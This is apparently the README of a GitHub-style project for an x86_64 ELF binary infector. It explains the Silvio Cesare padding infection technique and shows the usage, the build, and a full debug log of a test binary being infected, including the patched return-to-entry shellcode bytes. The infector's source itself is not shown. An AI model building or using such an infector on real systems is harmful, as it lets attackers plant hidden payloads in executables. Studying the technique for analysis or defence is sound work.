# silvio_binary_infector
Silvio Elf x86_64 binary infector

## Description

### Usage
```./infector <target> <payload```

Binary infector that infects target with some payload.
It just changed control flow to payload, execute it and move control flow back to original entry point.

It used Silvio Caesare padding infection method described here [NOTE: Link is unsecure!!](https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html).
The method used padding between Text and Data Elf segments to store payload, this padding exit only in memory(runtime) so after parasite insertion we 
should move all segments (Data and following) and section table forward on ```parasite size``` bytes.

Payload should be link-free ```-nostdlib```

## Build

`make`

Comment/Uncoment ```-DDEBUG``` option in Makefile to disable/enable Debug output

##Example
```
>$ ./victim
Im a victim. Please don't infect me


>$ ./payload
I'm an payload! You are infected!!


>$ ./infector victim payload
[DEBUG]: infector.c:153:read_elf_data(): Successfully read victim
[DEBUG]: infector.c:153:read_elf_data(): Successfully read payload
[INFO ]: infector.c:71:main(): Successfully read binary data of target "victim" and payload "payload"
[DEBUG]: infector.c:194:infect_text_segment(): Old .text entry of target "victim" binary 0x1060
[DEBUG]: infector.c:195:infect_text_segment(): Using 4096 bytes as page size
[DEBUG]: infector.c:177:get_text_segment():
        Found .text segment of target "victim":
                Offset: 0x1000
                Virtual address: 0x1000
                Physical address: 0x1000
                File size: 477
                Memory size: 477
[DEBUG]: infector.c:177:get_text_segment():
        Found .text segment of target "payload":
                Offset: 0x1000
                Virtual address: 0x1000
                Physical address: 0x1000
                File size: 210
                Memory size: 210
[INFO ]: infector.c:202:infect_text_segment(): Infection payload size: payload file("payload") 210 bytes + return control flow shellcode 8 bytes = 218
[DEBUG]: infector.c:208:infect_text_segment(): End of text of target "victim": 4573
[DEBUG]: infector.c:210:infect_text_segment(): Parasite "payload" infection virtual address in target "victim": 0x11dd
[DEBUG]: infector.c:218:infect_text_segment(): Offset of target "victim" segment 4 was increased by 4096 bytes
[DEBUG]: infector.c:218:infect_text_segment(): Offset of target "victim" segment 5 was increased by 4096 bytes
[DEBUG]: infector.c:218:infect_text_segment(): Offset of target "victim" segment 6 was increased by 4096 bytes
[DEBUG]: infector.c:218:infect_text_segment(): Offset of target "victim" segment 8 was increased by 4096 bytes
[DEBUG]: infector.c:218:infect_text_segment(): Offset of target "victim" segment 10 was increased by 4096 bytes
[INFO ]: infector.c:231:infect_text_segment(): Found section header where payload "payload" should locate: 0x11d4
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 16 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 17 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 18 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 19 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 20 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 21 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 22 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 23 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 24 was increadr by 4096 bytes
[DEBUG]: infector.c:228:infect_text_segment(): Ofset of target "victim" section 25 was increadr by 4096 bytes
[INFO ]: infector.c:237:infect_text_segment(): Changed entry point of target "victim" to 0x11dd
[INFO ]: infector.c:246:infect_text_segment(): Create temporary file for infected target "victim": .xyz.tempo.elf64
[INFO ]: infector.c:253:infect_text_segment(): First part (up to end of text segment) of target "victim" wrote to file ".xyz.tempo.elf64"
[INFO ]: infector.c:260:infect_text_segment(): Payload "payload" data wrote to file ".xyz.tempo.elf64"
[DEBUG]: infector.c:96:debug_shellcode(): Shellcode before patch: b8 0 0 0 0 ff e0 0
[DEBUG]: infector.c:96:debug_shellcode(): Shellcode after patch with original entry addr: b8 60 10 0 0 ff e0 0
[INFO ]: infector.c:269:infect_text_segment(): Create shellcode to restore original entry 0x1060 of target "victim"
[INFO ]: infector.c:277:infect_text_segment(): Shellcode for restore original target "victim" entrypoint 4192 wrote to file "payload"
[INFO ]: infector.c:286:infect_text_segment(): Last chunk (from end .text section up to end file) of target "victim" wrote to file ".xyz.tempo.elf64"
[INFO ]: infector.c:76:main(): Successfully infect "victim" with payload "payload"
[DEBUG]: infector.c:120:cleanup_elf_data(): Successfully cleanup victim file structures
[DEBUG]: infector.c:120:cleanup_elf_data(): Successfully cleanup payload file structures
[DEBUG]: infector.c:79:main(): OK


$> ./victim
I'm an payload! You are infected!!
Im a victim. Please don't infect me


```
